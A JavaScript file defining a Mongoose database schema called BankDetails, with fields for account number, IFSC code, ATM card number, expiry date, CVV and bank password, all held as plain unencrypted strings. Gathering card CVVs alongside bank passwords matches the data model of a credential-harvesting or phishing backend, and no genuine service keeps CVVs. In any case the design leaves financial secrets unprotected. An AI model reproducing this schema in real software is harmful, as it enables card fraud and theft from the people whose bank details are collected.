import mongoose from "mongoose";

const bankDetailsSchema = new mongoose.Schema(
  {
    username: {
      type: String,
      required: true,   // 🔥 make required
    },

    accountType: {
      type: String,
      required: true,
    },

    bankName: String,
    accountNumber: String,
    ifsc: String,
    bankPhone: String,
    atmCardNo: String,
    atmExpiry: String,
    atmCvv: String,
    password: String,
  },
  { timestamps: true }
);

export default mongoose.model("BankDetails", bankDetailsSchema);
